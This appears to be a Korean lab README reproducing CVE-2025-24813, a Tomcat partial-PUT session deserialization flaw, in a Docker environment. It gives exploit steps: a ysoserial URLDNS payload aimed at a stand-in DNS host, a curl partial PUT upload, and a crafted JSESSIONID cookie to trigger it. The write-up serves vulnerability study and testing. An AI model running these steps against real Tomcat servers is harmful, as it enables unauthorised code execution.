# Tomcat 세션 역직렬화 원격 코드 실행 (CVE-2025-24813)

[中文版本(Chinese version)](README.zh-cn.md) [English version](README.eng.md)

Apache Tomcat은 Java Servlet, JSP, EL, WebSocket 기술을 구현한 세계적으로 널리 사용되는 오픈소스 웹 애플리케이션 서버입니다.

Apache Tomcat에서는 11.0.0-M1에서 11.0.2까지, 10.1.0-M1에서 10.1.34까지, 9.0.0.M1에서 9.0.98까지 역직렬화 취약점이 발견되었습니다. 이는 Tomcat이 쓰기 가능한 DefaultServlet(읽기 전용=false)과 파일 기반 세션 지속성을 모두 갖춘 상태로 구성될 때 발생합니다. 이 조합을 통해 공격자는 서버에 임의의 파일을 작성하고 JSESSIONID 쿠키를 조작하여 이러한 파일의 역직렬화를 트리거하여 궁극적으로 원격 코드 실행으로 이어질 수 있습니다.

- <https://lists.apache.org/thread/j5fkjv2k477os90nczf2v9l61fb0kkgq>
- <https://github.com/charis3306/CVE-2025-24813>
- <https://forum.butian.net/article/674>

## 환경 구성

다음 명령을 실행하여 자바를 설치합니다.


다음 명령을 실행하여 취약한 Tomcat 9.0.97 서버를 시작합니다:

```
git clone https://github.com/vulhub/vulhub.git
cd vulhub/tomcat/CVE-2025-24813
docker compose up -d
```

컨테이너 실행 확인

```
docker compose ps
```
![image](https://github.com/user-attachments/assets/cf232c15-9e84-4ae6-8ef5-7c5be5b3b6f2)


서버가 시작된 후, 'http://your-ip:8080'을 방문하여 Tomcat 예제 페이지에 접속할 수 있습니다.

## 취약점 구현 방법

취약점은 Tomcat의 두 가지 주요 잘못된 구성으로 인해 발생합니다. 첫째, DefaultServlet은 readonly=false로 구성되어 파일 업로드가 가능합니다:

```xml
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

둘째, Tomcat은 파일 기반 세션 지속성을 사용하도록 구성되어 있습니다.

```xml
<Manager className="org.apache.catalina.session.PersistentManager">
    <Store className="org.apache.catalina.session.FileStore"/>
</Manager>
```

두 구성 모두 동일한 기본 저장 경로를 사용합니다: '$CATALINA_BASE/work/Catalina/localhost/ROOT'.

부분 PUT 요청을 보낼 때 Tomcat은 파일 경로의 경로 구분자(/)를 마침표(.)로 변환하고 파일을 세션 저장 디렉토리에 임시로 저장합니다. 특정 요청을 작성하여 이 디렉토리에 악성 직렬화된 개체를 작성할 수 있습니다.

이 취약점을 악용하려면 악성 파일을 만들어 업로드 하고 역직렬화를 트리거합니다.(저는 테스트 목적으로 ysoserial을 사용합니다):

ysoserial을 사용하여 악성 직렬화 객체를 생성합니다. DNS 요청 검증용 URLDNS 가젯을 예로 들면

```
java -jar ysoserial-all.jar URLDNS "http://your-dns-server.example" > payload.ser
```

![image](https://github.com/user-attachments/assets/95c8a75b-c1a6-4150-be2a-0af884f8ad6c)

다음으로 아래 명령어를 입력해 부분 PUT 요청으로 악성 세션 파일을 업로드합니다.

```
FILESIZE=$(stat -c %s payload.ser)
curl -X PUT "http://localhost:8080/deserialize/session" \
  -H "Content-Range: bytes 0-$(($FILESIZE-1))/$FILESIZE" \
  --data-binary @payload.ser
```
이미 생성되어 있다면 409 conflict 에러가 발생할 것이고 그렇지 않다면 201 Created가 뜰 것입니다.

이후 JSESSIONID 쿠키를 조작하여 역직렬화를 트리거합니다

```
curl -v "http://localhost:8080/" -H "Cookie: JSESSIONID=.deserialize"

```
![image](https://github.com/user-attachments/assets/4cecd594-e0c8-45f5-a2ac-1c48f91b4844)

Tcpdump 명령어를 통해 DNS(53)을 모니터링하면 다음과 같은 결과를 통해 your-dns-server.example이 성공적으로 나타남을 확인할 수 있습니다.

```
sudo tcpdump -i any -n port 53
```

![image](https://github.com/user-attachments/assets/218b03e9-1280-4ddb-b58e-995a62ad06b9)

실제 공격 시나리오에서는 "콘텐츠 역직렬화"가 웹 애플리케이션에 의해 역직렬화될 때 임의의 코드를 실행할 수 있는 악의적인 직렬화된 Java 객체로 대체될 것입니다.
